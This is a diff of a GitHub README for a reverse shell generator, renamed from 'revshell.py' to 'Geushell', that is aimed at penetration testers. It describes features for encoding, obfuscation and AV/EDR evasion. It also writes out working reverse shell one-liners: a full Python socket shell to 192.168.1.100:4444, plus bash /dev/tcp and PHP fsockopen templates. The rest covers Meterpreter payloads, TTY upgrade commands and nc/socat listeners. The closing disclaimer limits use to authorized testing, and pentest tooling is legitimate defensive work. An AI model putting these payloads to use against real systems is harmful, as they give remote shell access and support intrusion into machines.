@@ -1,86 +1,101 @@
-# README for Reverse Shell Generator
+# Geushell - Your Comprehensive Reverse Shell Generator
 
 ## Overview
-This tool is a versatile reverse shell generator designed to assist cybersecurity professionals and ethical hackers in setting up reverse shells for penetration testing and red teaming activities. It supports multiple languages and includes features like Base64 encoding, shell obfuscation, and encryption to bypass security measures.
+**Geushell** is an advanced tool designed to simplify the generation of reverse shells for penetration testers and cybersecurity enthusiasts. With its user-friendly interface and robust functionality, Geushell helps users quickly create, customize, and execute reverse shell payloads across various platforms, complete with built-in listeners and TTY upgrade methods.
 
 ## Features
-- **Multiple Reverse Shell Languages**: Supports Bash, Python, PHP, Perl, Ruby, PowerShell, Netcat, UDP Bash, HTTP Python, and ICMP Python.
-- **Base64 Encoding**: Encodes the generated shell for easy transfer.
-- **Shell Obfuscation**: Obfuscates the shell to bypass basic AV/EDR systems.
-- **Encryption**: Encrypts the shell payload using AES or RSA encryption.
-- **TTY Shell Upgrade**: Provides commands to upgrade the shell to a TTY shell.
-- **Listener Setup**: Automatically sets up a listener using Metasploit or Netcat.
+- **Diverse Payloads**: Generate reverse shells for popular platforms and languages, including Bash, Python, PHP, Ruby, PowerShell, and more.
+- **Metasploit Integration**: Support for common Metasploit payloads to facilitate rapid testing.
+- **Customizable Options**: Encode or obfuscate generated payloads for better evasion.
+- **Built-in Listeners**: Easily start `nc`, `socat`, or `msfconsole` listeners.
+- **TTY Upgrade Methods**: Multiple ways to upgrade shells to TTY for enhanced control.
+- **History Management**: Save and load configuration history for repeated use.
 
 ## Installation
 1. Clone the repository:
    ```bash
-   git clone https://github.com/S2K7x/revshell.py
-   cd reverse-shell-generator
+   git clone https://github.com/S2K7x/geushell.git
+   cd geushell
    ```
-
-2. Install the required dependencies (if any):
+2. Install required Python packages:
    ```bash
    pip install -r requirements.txt
    ```
-
-## Usage
-1. Run the script:
+3. Ensure **Geushell** has permission to run:
    ```bash
-   python revshell.py
+   chmod +x geushell.py
    ```
 
-2. Follow the on-screen instructions to generate a reverse shell.
+## Configuration
+Geushell loads its configuration from a `config.json` file, which defines reverse shell templates, Metasploit payloads, TTY upgrade methods, and listener commands. Make sure this file is located in the same directory as the main script.
 
-### Example
-```bash
-[*] Detected local OS: Linux
-
-[*] Enter target IP: 192.168.1.100
-[*] Enter target port: 4444
-
-Available reverse shells:
-1. bash
-2. python
-3. php
-4. perl
-5. ruby
-6. powershell
-7. nc
-8. udp_bash
-9. http_python
-10. icmp_python
-
-[*] Enter the reverse shell language/type (number): 2
-[*] Do you want to Base64 encode the shell? (y/n): y
-[*] Do you want to obfuscate the shell? (y/n): n
-[*] Do you want to encrypt the shell communication (AES/RSA)? (aes/rsa/none): none
-
-[+] Generated Reverse Shell for python:
-
-python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.100",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
-
-[*] Generate another reverse shell? (y/n): n
-[*] Exiting...
+Example `config.json`:
+```json
+{
+  "reverse_shells": {
+    "bash": "bash -i >& /dev/tcp/{}/{} 0>&1",
+    "python": "python3 -c 'import socket,subprocess,os; ...'",
+    "php": "php -r '$sock=fsockopen(\"{}\",{});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+  },
+  "metasploit_payloads": {
+    "linux_meterpreter": "linux/x64/meterpreter/reverse_tcp",
+    "windows_meterpreter": "windows/meterpreter/reverse_tcp"
+  },
+  "tty_upgrade_methods": [
+    "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+    "echo os.system('/bin/bash')",
+    "script /dev/null -c bash"
+  ],
+  "listeners": {
+    "nc": "nc -lvnp {}",
+    "socat": "socat TCP-LISTEN:{},reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sane"
+  },
+  "history_file": "~/.geushell_history.json"
+}
 ```
 
-## Configuration
-- **Encryption**: The tool supports AES and RSA encryption. For RSA, ensure you have the `public_key.pem` file in the same directory.
-- **Listener**: The tool uses Metasploit for setting up listeners. Ensure Metasploit is installed and properly configured.
+## Usage
+Run Geushell with the following command:
+```bash
+python3 geushell.py
+```
 
-## Dependencies
-- Python 3.x
-- Metasploit Framework (for listener setup)
-- OpenSSL (for encryption)
+### Basic Workflow
+1. **Enter target IP and port**.
+2. **Select a reverse shell type**.
+3. **Choose to encode or obfuscate** the payload (optional).
+4. **Generate the reverse shell**.
+5. **Start a listener** for the target connection.
+6. **Upgrade the shell to TTY** for better interaction (optional).
+
+### Example Session
+```plaintext
+[*] Enter target IP: 192.168.1.10
+[*] Enter target port: 4444
+[*] Available Shells:
+[1] bash
+[2] python
+[3] php
+[*] Choose a reverse shell: 2
+[+] Generated Reverse Shell:
+python3 -c 'import socket,subprocess,os; s=socket.socket(...)
+[*] Upgrade to TTY? (y/n): y
+[+] Run this TTY upgrade:
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+[*] Choose listener (nc/socat/msfconsole): nc
+[*] Starting listener with:
+nc -lvnp 4444
+```
 
 ## Contributing
-Contributions are welcome! Please open an issue or submit a pull request.
+Contributions are welcome! Please fork the repository and submit a pull request.
 
 ## License
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+This project is licensed under the MIT License.
 
 ## Disclaimer
-This tool is intended for educational and ethical hacking purposes only. Unauthorized access to computer systems is illegal. Use this tool responsibly and only on systems you own or have explicit permission to test.
+**Geushell** is intended for legal and ethical use only. Ensure you have proper authorization before using this tool in any penetration testing scenarios.
 
 ---
+Thank you for using **Geushell**! We hope it becomes a valuable asset in your security toolkit.
 
-Thank you for using the Reverse Shell Generator! If you have any questions or need further assistance, please don't hesitate to contact us.
